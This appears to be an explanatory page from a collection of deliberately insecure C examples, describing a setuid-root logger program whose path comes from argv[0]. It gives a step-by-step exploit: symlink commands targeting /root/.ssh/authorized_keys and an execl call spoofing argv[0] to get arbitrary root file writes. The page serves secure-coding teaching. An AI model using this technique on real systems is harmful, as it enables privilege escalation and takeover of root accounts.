# Contents

- [privilege_escalation.c](#privilege_escalationc)

&nbsp;

## [privilege_escalation.c](../../examples/insecure/c/privilege_escalation.c)
Path: `/examples/insecure/c/privilege_escalation.c`

### Explanation

In lines 22-23, the program gains **root privileges** via `setuid(0)` and `seteuid(0)`. However in line 25, the `logger_path` variable is derived from `argv[0]`:

**Issue:** argv[0] is controlled by the user invoking the program.  
If executed as `execl("/opt/logger/bin/loggerctl", "/tmp/fake_path", "rotate", NULL);`,  
**logger_path** resolves to **/tmp/fake_path**'s parent directory.

#### **Arbitrary File Write via Symlink**
Prepare a fake directory structure
```bash
mkdir -p /tmp/fakedir/{bin,logs}
cd /tmp/fakedir/logs
echo "malware" > global.log 
ln -s /root/.ssh/authorized_keys global-$(date -u +"%FT%T").log  # Create a symlink
```
Execute the program with a fake path
```c
#include <unistd.h>
int main() {
    // Set argv[0] to /tmp/fakedir/bin/loggerctl
    execl("/opt/logger/bin/loggerctl", "/tmp/fakedir/bin/loggerctl", "rotate", NULL);
}
```
Trigger the `rotate_log()` function
```c
snprintf(log_old, "...", "%s/../logs/global.log", logger_path); // /tmp/fakedir/logs/global.log
snprintf(log_new, "...", "%s/../logs/global-...log", logger_path); // /tmp/fakedir/logs/global-2025-02-19T11:34:12.log
execl("/bin/cp", "/bin/cp", "-a", log_old, log_new, NULL); // cp -a /tmp/fakedir/logs/global.log /tmp/fakedir/logs/global-2025-02-19T11:34:12.log
```
- **Outcome:** The contents of `global.log` are copied to the **`/root/.ssh/authorized_keys`** file via the symlink.

### **Impact**
- **Arbitrary File Write as Root:** Attacker can overwrite critical system files like `/etc/passwd`, `/etc/sudoers` or inject SSH keys.
- **Privilege Escalation:** A low-privileged user can gain full root access. This vulnerability arises from **uncontrolled `argv[0]` manipulation** and `cp` following **symlinks**. 

&nbsp;
